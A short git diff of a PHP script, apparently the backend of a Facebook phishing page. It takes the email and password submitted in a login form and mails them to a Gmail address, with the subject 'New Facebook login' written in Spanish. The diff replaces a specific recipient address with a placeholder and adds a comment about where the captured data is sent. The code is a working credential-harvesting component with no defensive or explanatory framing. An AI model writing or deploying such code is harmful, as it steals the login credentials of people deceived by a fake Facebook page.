@@ -4,8 +4,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $email = $_POST['email'];
     $password = $_POST['password'];
 
-    // Configurar el correo
-    $to = "tchiquito1999@gmail.com";
+    // Configurar el correo al que se envian los datos ingresados en la pagina
+    $to = "correoDelReceptor@gmail.com";
     $subject = "Nuevo inicio de sesión en Facebook";
     $message = "Se ha intentado iniciar sesión con los siguientes datos:\n";
     $message .= "Correo electrónico o número de teléfono: " . $email . "\n";
